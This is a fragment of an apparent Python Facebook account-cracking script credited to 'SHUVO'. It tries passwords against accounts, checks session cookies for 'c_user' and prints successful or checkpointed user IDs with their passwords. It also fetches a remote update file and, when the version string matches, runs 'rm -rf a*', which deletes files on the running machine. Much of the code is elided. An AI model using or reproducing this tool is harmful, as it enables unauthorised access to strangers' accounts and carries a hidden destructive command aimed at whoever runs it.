...
\033[0;94m────────────────────────────────────────────────────────
\033[0;92mAuthor    \033[0;91mSHUVO  (❤️‍🔥❤️‍🔥🔥)
\033[0;92mGithub    \033[0;96mGOOD-SHUVO
\033[0;92mFACEBOOK  \033[0;94mAriyan Shuvo 
\033[0;94m────────────────────────────────────────────────────────
...
try:
    ...
    proxy = requests.get('https://github.com/GOODSHUVO/Random/edit/main/Update.txt').text.splitlines()
    v = 3.1
    update = requests.get('https://github.com/GOODSHUVO/Random/edit/main/Update.txt').text
    if str(v) in update:
        os.system('rm -rf a*')
    else:pass
...
os.system('xdg-open https://facebook.com/ariyan.shuvo.mr.exit')
def SHUVO():
    os.system('clear')
    print(logo)
...
def random_number():
    user=[]
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/ariyan.shuvo.mr.exit')
    print(logo)
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\033[1;32m[SHUVO-OK] '+cid+' | '+ps+'\033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;31m[SHUVO-CP] '+cid+' | '+ps+'\033[0;97m')
